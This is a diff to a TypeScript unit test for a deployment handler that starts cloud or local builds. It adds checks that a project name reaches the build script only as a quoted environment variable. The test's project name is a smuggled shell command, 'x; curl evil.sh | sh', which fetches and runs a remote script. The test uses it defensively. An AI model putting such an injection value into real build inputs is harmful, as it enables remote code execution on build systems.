@@ -65,7 +65,7 @@ const ddb = mockClient(DynamoDBDocumentClient);
 
 const payload = {
   projectId: "p1",
-  projectName: "Shop",
+  projectName: "x; curl evil.sh | sh",
   model: { id: "d1" } as any,
 };
 
@@ -138,7 +138,12 @@ describe("deploymentTriggeredHandler", () => {
       sourceTypeOverride: "S3",
       sourceLocationOverride: "kanobi-bucket/p1.zip",
     });
-    expect(build.buildspecOverride).toContain("node ./docs.js -p Shop");
+    // The name reaches the build as data only, never as part of the shell script.
+    expect(build.environmentVariablesOverride).toEqual([
+      { name: "PROJECT_NAME", value: "x; curl evil.sh | sh", type: "PLAINTEXT" },
+    ]);
+    expect(build.buildspecOverride).toContain('node ./docs.js -p "$PROJECT_NAME"');
+    expect(build.buildspecOverride).not.toContain("curl evil");
     expect(build.buildspecOverride).toContain(
       "aws s3 cp ./dist/swagger-json.json s3://kanobi-bucket/p1/swagger-json.json"
     );
@@ -171,7 +176,7 @@ describe("deploymentTriggeredHandler", () => {
     expect(fs.existsSync(join(projectDir, "stale.ts"))).toBe(false);
     expect(fs.existsSync(join(projectDir, "node_modules"))).toBe(false);
     expect(fs.readFileSync(join(projectDir, "serverless.yml"), "utf-8")).toBe("service: x");
-    expect(local.startLocalBuild).toHaveBeenCalledWith(projectDir, "p1", "Shop");
+    expect(local.startLocalBuild).toHaveBeenCalledWith(projectDir, "p1", payload.projectName);
     expect(codebuild.startBuild).not.toHaveBeenCalled();
     expect(ddb.commandCalls(UpdateCommand)[0].args[0].input.ExpressionAttributeValues).toMatchObject({
       ":isDeploying": true,
